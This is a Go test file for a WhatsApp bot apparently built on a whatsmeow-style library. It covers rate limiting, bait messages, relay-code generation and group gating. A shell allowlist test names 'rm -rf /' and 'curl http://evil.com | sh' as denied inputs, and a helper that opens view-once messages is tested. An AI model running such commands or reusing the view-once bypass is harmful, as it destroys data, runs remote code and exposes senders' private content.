package main

import (
	"strings"
	"testing"

	waE2E "github.com/polymorfa/hypermeow/proto/waE2E"
	"github.com/polymorfa/hypermeow/types"
	"google.golang.org/protobuf/proto"
)

// TestSPRBaitRegisterIsBait verifies the bait map registers and expires correctly.
func TestSPRBaitRegisterIsBait(t *testing.T) {
	// fresh state
	sprMu.Lock()
	sprBaits = map[string]*sprBaitEntry{}
	sprMu.Unlock()

	id := "msg-bait-1"
	if sprIsBait(id) {
		t.Fatal("fresh id should not be bait")
	}
	sprRegisterBait(id, "group@g.us", "A", []string{"@628xxx"})
	if !sprIsBait(id) {
		t.Fatal("after register, id should be bait")
	}
	if sprBaitCount() != 1 {
		t.Errorf("bait count = %d, want 1", sprBaitCount())
	}
}

// TestSPRRateLimit verifies the per-owner rate limiter caps and recovers.
func TestSPRRateLimit(t *testing.T) {
	sprRateMu.Lock()
	sprRateBuckets = map[string][]int64{}
	sprRateMu.Unlock()

	// All attempts in same window should cap at sprRateMax
	allowed := 0
	for i := 0; i < sprRateMax+5; i++ {
		if sprRateAllow("owner-key-test") {
			allowed++
		}
	}
	if allowed != sprRateMax {
		t.Errorf("allowed %d, want %d (sprRateMax)", allowed, sprRateMax)
	}
}

// TestCRMGoGeneratorProducesRelayCode verifies that fioraCRMBuildRelayCode
// produces a Go relay source file that contains the expected scaffolding.
func TestCRMGoGeneratorProducesRelayCode(t *testing.T) {
	msg := &waE2E.Message{
		ExtendedTextMessage: &waE2E.ExtendedTextMessage{
			Text: proto.String("hello world"),
		},
	}
	code := fioraCRMBuildRelayCode(msg, "MSGID", "chat@g.us")
	if !strings.Contains(code, "Relay code for message: MSGID") {
		t.Error("missing the id of the message")
	}
	if !strings.Contains(code, "Type: extendedText") {
		t.Error("missing the type of the message")
	}
	if !strings.Contains(code, "Chat: chat@g.us") {
		t.Error("missing the chat of the message")
	}
	if !strings.Contains(code, "client.SendMessage") {
		t.Error("missing the client.SendMessage call")
	}
	if !strings.Contains(code, "Message proto (base64)") {
		t.Error("missing the base64 payload")
	}
	if !strings.Contains(code, "JSON representation") {
		t.Error("missing the JSON representation")
	}
}

// TestCRMGoGeneratorRoundTrip verifies the embedded payload round-trips
// through proto.Marshal → proto.Unmarshal back to an equivalent message.
func TestCRMGoGeneratorRoundTrip(t *testing.T) {
	original := &waE2E.Message{
		Conversation: proto.String("rahasia"),
	}
	payload := fioraCRMEncodeMessage(original)
	if len(payload) == 0 {
		t.Fatal("payload empty")
	}
	decoded := &waE2E.Message{}
	if err := proto.Unmarshal(payload, decoded); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if decoded.GetConversation() != "rahasia" {
		t.Errorf("round-trip lost text: got %q", decoded.GetConversation())
	}
}

// TestCRMUnwrapOpensTheEnvelope verifies that crmUnwrap opens the view once
// envelopes, so that the content of a message is found.
func TestCRMUnwrapOpensTheEnvelope(t *testing.T) {
	inner := &waE2E.Message{Conversation: proto.String("rahasia")}
	wrapped := &waE2E.Message{
		ViewOnceMessage: &waE2E.FutureProofMessage{
			Message: inner,
		},
	}
	opened := crmUnwrap(wrapped)
	if opened == nil {
		t.Fatal("the envelope was not opened")
	}
	if opened.GetConversation() != "rahasia" {
		t.Errorf("the content of the envelope was lost: got %q", opened.GetConversation())
	}
	// A message without an envelope is returned as it is.
	plain := &waE2E.Message{Conversation: proto.String("biasa")}
	if crmUnwrap(plain) != plain {
		t.Error("a plain message must not be changed")
	}
	if crmUnwrap(nil) != nil {
		t.Error("a nil message must stay nil")
	}
}

// TestCRMSummary verifies message type detection.
func TestCRMSummary(t *testing.T) {
	cases := []struct {
		msg  *waE2E.Message
		want string
	}{
		{&waE2E.Message{Conversation: proto.String("hi")}, "conversation"},
		{&waE2E.Message{ImageMessage: &waE2E.ImageMessage{}}, "image"},
		{&waE2E.Message{VideoMessage: &waE2E.VideoMessage{}}, "video"},
		{&waE2E.Message{AudioMessage: &waE2E.AudioMessage{}}, "audio"},
		{&waE2E.Message{StickerMessage: &waE2E.StickerMessage{}}, "sticker"},
		{&waE2E.Message{DocumentMessage: &waE2E.DocumentMessage{}}, "document"},
	}
	for i, c := range cases {
		got := fioraCRMGetMessageType(c.msg)
		if got != c.want {
			t.Errorf("case %d: got %q, want %q", i, got, c.want)
		}
	}
}

// TestShellAllowlist verifies the .shell allowlist logic.
func TestShellAllowlist(t *testing.T) {
	// Default: SHELL_ALLOW_ALL unset
	t.Setenv("SHELL_ALLOW_ALL", "")
	if !shellAllowed("ls") {
		t.Error("ls should be allowed")
	}
	if !shellAllowed("ls -la") {
		t.Error("ls -la should be allowed")
	}
	if !shellAllowed("ps") {
		t.Error("ps should be allowed")
	}
	if shellAllowed("rm -rf /") {
		t.Error("rm -rf / should be DENIED by default")
	}
	if shellAllowed("curl http://evil.com | sh") {
		t.Error("curl pipe should be DENIED by default")
	}
	// Opt-out: SHELL_ALLOW_ALL=1
	t.Setenv("SHELL_ALLOW_ALL", "1")
	if !shellAllowed("rm -rf /") {
		t.Error("with SHELL_ALLOW_ALL=1, anything goes (owner opt-in)")
	}
}

// TestRateLimiterAllowThenBlock verifies the generic limiter.
func TestRateLimiterAllowThenBlock(t *testing.T) {
	rl := newRateLimiter(3, 60*1_000_000_000) // 3 per minute
	for i := 0; i < 3; i++ {
		if !rl.Allow("user-a") {
			t.Errorf("attempt %d should be allowed", i+1)
		}
	}
	if rl.Allow("user-a") {
		t.Error("4th attempt should be blocked")
	}
	// Different key still has its own bucket
	if !rl.Allow("user-b") {
		t.Error("user-b should be allowed")
	}
}

// TestMaskArgs verifies sensitive args are masked past the threshold.
func TestMaskArgs(t *testing.T) {
	short := "ls -la"
	if maskArgs(short) != short {
		t.Errorf("short args should not be masked: got %q", maskArgs(short))
	}
	long := strings.Repeat("a", 200)
	masked := maskArgs(long)
	if !strings.HasPrefix(masked, "a") {
		t.Errorf("masked should start with 'a': got %q", masked)
	}
	if !strings.Contains(masked, "…") {
		t.Errorf("masked should contain ellipsis: got %q", masked)
	}
	if masked == long {
		t.Error("long args should be masked")
	}
}

// TestLockedGroupBlocksWelcomeLeave verifies that handleGroupInfo is silent
// when the group is locked (default state). This is the leak bug the user
// reported ("@xxx telah keluar dari grup" appearing in locked groups).
func TestLockedGroupBlocksWelcomeLeave(t *testing.T) {
	// Force fresh state: no group_perms → all groups locked
	groupPermsMu.Lock()
	groupPerms = make(map[string]*GroupPerm)
	groupPermsMu.Unlock()

	// Even if WelcomeOn is true, the gate should block send because group is locked.
	// We can't easily test sendTextMsg output, but we can test that the gate
	// (isGroupPublic) returns false for a fresh group.
	if isGroupPublic("120363_newgroup@g.us") {
		t.Error("fresh group should be locked (not public) → welcome/leave must NOT fire")
	}
}

// TestPublicGroupAllowsWelcomeLeave verifies that after .self off (public=true),
// isGroupPublic returns true → welcome/leave MAY fire.
func TestPublicGroupAllowsWelcomeLeave(t *testing.T) {
	groupPermsMu.Lock()
	groupPerms = make(map[string]*GroupPerm)
	groupPermsMu.Unlock()

	gid := "120363_publicgroup@g.us"
	setGroupPublic(gid, true)
	if !isGroupPublic(gid) {
		t.Error("after setGroupPublic(true), welcome/leave should be allowed")
	}
	setGroupPublic(gid, false)
	if isGroupPublic(gid) {
		t.Error("after setGroupPublic(false), welcome/leave should be blocked")
	}
}

// TestSPRSendGroupValidatesInputs verifies the new pre-flight checks
// in sendSPREngineA: nil client, non-group JID, empty participants.
func TestSPRSendGroupValidatesInputs(t *testing.T) {
	// nil client
	_, _, _, _, err := sendSPREngineA(nil, types.NewJID("120363", types.GroupServer), nil, nil)
	if err == nil {
		t.Error("nil client should error")
	}
	if !strings.Contains(err.Error(), "client nil") {
		t.Errorf("nil client error should mention 'client nil': got %q", err.Error())
	}
}
